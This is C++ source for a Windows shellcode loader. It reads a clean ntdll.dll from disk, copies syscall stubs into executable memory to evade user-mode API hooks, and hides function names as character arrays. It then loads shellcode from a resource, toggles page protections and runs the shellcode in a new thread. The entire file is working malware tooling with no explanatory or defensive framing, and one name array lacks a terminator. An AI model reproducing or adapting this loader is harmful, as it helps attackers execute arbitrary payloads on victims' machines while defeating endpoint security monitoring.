#include"..\public.hpp"

#define NtCurrentProcess()	   ((HANDLE)-1)

using namespace std;

typedef enum _WAIT_TYPE
{
	WaitAll = 0,
	WaitAny = 1
} WAIT_TYPE, * PWAIT_TYPE;

ULONG64 rva2ofs(PIMAGE_NT_HEADERS nt, DWORD rva)
{
	PIMAGE_SECTION_HEADER sh;
	int                   i;

	if (rva == 0) return -1;

	sh = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader + nt->FileHeader.SizeOfOptionalHeader);

	for (i = nt->FileHeader.NumberOfSections - 1; i >= 0; i--)
	{
		if (sh[i].VirtualAddress <= rva && rva <= (DWORD)sh[i].VirtualAddress + sh[i].SizeOfRawData)
		{
			return sh[i].PointerToRawData + rva - sh[i].VirtualAddress;
		}
	}
	return -1;
}

LPVOID SysGetAddress(LPBYTE hModule, LPCSTR lpProcName)
{
	PIMAGE_DOS_HEADER       dos;
	PIMAGE_NT_HEADERS       nt;
	PIMAGE_DATA_DIRECTORY   dir;
	PIMAGE_EXPORT_DIRECTORY exp;
	DWORD                   rva, ofs, cnt;
	PCHAR                   str;
	PDWORD                  adr, sym;
	PWORD                   ord;
	if (hModule == NULL || lpProcName == NULL) return NULL;
	dos = (PIMAGE_DOS_HEADER)hModule;
	nt = (PIMAGE_NT_HEADERS)(hModule + dos->e_lfanew);
	dir = (PIMAGE_DATA_DIRECTORY)nt->OptionalHeader.DataDirectory;
	// no exports? exit
	rva = dir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	if (rva == 0) return NULL;
	ofs = rva2ofs(nt, rva);
	if (ofs == -1) return NULL;
	// no exported symbols? exit
	exp = (PIMAGE_EXPORT_DIRECTORY)(ofs + hModule);
	cnt = exp->NumberOfNames;
	if (cnt == 0) return NULL;
	// read the array containing address of api names
	ofs = rva2ofs(nt, exp->AddressOfNames);
	if (ofs == -1) return NULL;
	sym = (PDWORD)(ofs + hModule);
	// read the array containing address of api
	ofs = rva2ofs(nt, exp->AddressOfFunctions);
	if (ofs == -1) return NULL;
	adr = (PDWORD)(ofs + hModule);
	// read the array containing list of ordinals
	ofs = rva2ofs(nt, exp->AddressOfNameOrdinals);
	if (ofs == -1) return NULL;
	ord = (PWORD)(ofs + hModule);
	// scan symbol array for api string
	do {
		str = (PCHAR)(rva2ofs(nt, sym[cnt - 1]) + hModule);
		// found it?
		if (strcmp(str, lpProcName) == 0) {
			// return the address
			return (LPVOID)(rva2ofs(nt, adr[ord[cnt - 1]]) + hModule);
		}
	} while (--cnt);
	return NULL;
}

LPVOID GetSysStub(LPCSTR lpSyscallName)
{
	HANDLE                        file = NULL, map = NULL;
	LPBYTE                        mem = NULL;
	LPVOID                        cs = NULL;
	PIMAGE_DOS_HEADER             dos;
	PIMAGE_NT_HEADERS             nt;
	PIMAGE_DATA_DIRECTORY         dir;
	PIMAGE_RUNTIME_FUNCTION_ENTRY rf;
	ULONG64                       ofs, start = 0, end = 0, addr;
	SIZE_T                        len;
	DWORD                         i, rva;

	char path[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','n','t','d','l','l','.','d','l','l',0 };
	// open file
	file = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE) { goto cleanup; }
	// create mapping
	map = CreateFileMapping(file, NULL, PAGE_READONLY, 0, 0, NULL);
	if (map == NULL) { goto cleanup; }
	// create view
	mem = (LPBYTE)MapViewOfFile(map, FILE_MAP_READ, 0, 0, 0);
	if (mem == NULL) { goto cleanup; }
	// try resolve address of system call
	addr = (ULONG64)SysGetAddress(mem, lpSyscallName);
	if (addr == 0) { goto cleanup; }
	dos = (PIMAGE_DOS_HEADER)mem;
	nt = (PIMAGE_NT_HEADERS)((PBYTE)mem + dos->e_lfanew);
	dir = (PIMAGE_DATA_DIRECTORY)nt->OptionalHeader.DataDirectory;
	// no exception directory? exit
	rva = dir[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress;
	if (rva == 0) { goto cleanup; }
	ofs = rva2ofs(nt, rva);
	if (ofs == -1) { goto cleanup; }
	rf = (PIMAGE_RUNTIME_FUNCTION_ENTRY)(ofs + mem);
	// for each runtime function (there might be a better way??)
	for (i = 0; rf[i].BeginAddress != 0; i++) {
		// is it our system call?
		start = rva2ofs(nt, rf[i].BeginAddress) + (ULONG64)mem;
		if (start == addr) {
			// save the end and calculate length
			end = rva2ofs(nt, rf[i].EndAddress) + (ULONG64)mem;
			len = (SIZE_T)(end - start);
			// allocate RWX memory
			cs = VirtualAlloc(NULL, len,
				MEM_COMMIT | MEM_RESERVE,
				PAGE_EXECUTE_READWRITE);
			if (cs != NULL) {
				// copy system call code stub to memory
				CopyMemory(cs, (const void*)start, len);
			}
			break;
		}
	}
cleanup:
	if (mem != NULL) UnmapViewOfFile(mem);
	if (map != NULL) CloseHandle(map);
	if (file != NULL) CloseHandle(file);
	// return pointer to code stub or NULL
	return cs;
}

int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR    lpCmdLine, _In_ int       nCmdShow)
{    
	//1.Get shellcode and shellcodesize from Resource by ID
	UINT shellcodeSize = 0;
	unsigned char *shellcode = GetShellcodeFromRes(100, shellcodeSize);
	if (shellcode == nullptr)
	{
		return 0;
	}


	// Redefine Nt functions
	typedef NTSTATUS(NTAPI* pNtAVM)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
	unsigned char sNtAVM[] = { 'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0x0 };
	pNtAVM fnNtAVM = (pNtAVM)GetSysStub((LPCSTR)sNtAVM);

	typedef NTSTATUS(NTAPI* pNtPVM)(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);
	unsigned char sNtPVM[] = { 'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y',0x0 };
	pNtPVM fnNtPVM = (pNtPVM)GetSysStub((LPCSTR)sNtPVM);

	typedef void(WINAPI* pRMM)(void*, const void*, SIZE_T);
	unsigned char sRMM[] = { 'R','t','l','M','o','v','e','M','e','m','o','r','y',0x0 };
	pRMM fnRMM = (pRMM)GetSysStub((LPCSTR)sRMM);

	typedef NTSTATUS(NTAPI* pNtCTF)(PHANDLE hThread, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID lpStartAddress, PVOID lpParameter, ULONG Flags, SIZE_T StackZeroBits, SIZE_T SizeOfStackCommit, SIZE_T SizeOfStackReserve, PVOID lpBytesBuffer);
	unsigned char sNtCTF[] = { 'N','t','C','r','e','a','t','e','T','h','r','e','a','d','E','x', 0 };
	pNtCTF fnCTF = (pNtCTF)GetSysStub((LPCSTR)sNtCTF);

	typedef NTSTATUS(NTAPI* pNtWFMO)(ULONG Count, PHANDLE Handles, WAIT_TYPE WaitType, BOOLEAN Alertable, PLARGE_INTEGER Timeout OPTIONAL);
	unsigned char sWFMO[] = { 'N','t','W','a','i','t','F','o','r','M','u','l','t','i','p','l','e','O','b','j','e','c','t','s', 0 };
	pNtWFMO fnNtWFMO = (pNtWFMO)GetSysStub((LPCSTR)sWFMO);

	typedef NTSTATUS(NTAPI* pNtFVM)(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG FreeType);
	unsigned char sNtFVM[] = { 'N','t','F','r','e','e','V','i','r','t','u','a','l','M','e','m','o','r','y' };
	pNtFVM fnNtFVM = (pNtFVM)GetSysStub((LPCSTR)sNtFVM);

	PVOID BaseAddress = NULL;
	SIZE_T dwSize = shellcodeSize;
	fnNtAVM(NtCurrentProcess(), &BaseAddress, 0, &dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	fnRMM(BaseAddress, shellcode, shellcodeSize);

	HANDLE hThread;
	DWORD OldProtect = 0;
	fnNtPVM(NtCurrentProcess(), &BaseAddress, (PSIZE_T)&dwSize, PAGE_NOACCESS, &OldProtect);

	HANDLE hHostThread = INVALID_HANDLE_VALUE;
	fnCTF(&hHostThread, 0x1FFFFF, NULL, NtCurrentProcess(), (LPTHREAD_START_ROUTINE)BaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
	fnNtPVM(NtCurrentProcess(), &BaseAddress, (PSIZE_T)&dwSize, PAGE_EXECUTE, &OldProtect);
	fnNtWFMO(1, &hHostThread, WaitAll, FALSE, NULL);
	fnNtFVM((HANDLE)-1, &BaseAddress, &dwSize, MEM_RELEASE);
}